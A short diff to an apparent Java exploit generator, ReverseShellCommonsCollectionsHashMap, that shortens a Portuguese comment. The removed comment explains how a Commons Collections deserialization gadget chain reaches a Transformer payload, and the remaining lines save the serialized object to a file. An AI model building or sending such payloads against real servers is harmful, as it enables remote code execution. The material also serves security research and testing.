@@ -130,10 +130,7 @@ public class ReverseShellCommonsCollectionsHashMap {
         keyField.setAccessible(true);
         keyField.set(node, entry);
 
-        // Serializa o objeto "handlerProxy" e o salva em arquivo. Ao ser desserializado,
-        // o readObject irá executar um map.entrySet() e, assim, desviar o fluxo para o invoke().
-        // No invoke(), uma chave inexistente será buscada no campo "memberValues" (que contém um LazyMap
-        // com a cadeia de Transformers), o que deverá acionar o Thread.sleep(10000)!
+        // Serializa o objeto
         System.out.println("Saving serialized object in ReverseShellCommonsCollectionsHashMap.ser");
         FileOutputStream fos = new FileOutputStream("ReverseShellCommonsCollectionsHashMap.ser");
         ObjectOutputStream oos = new ObjectOutputStream(fos);
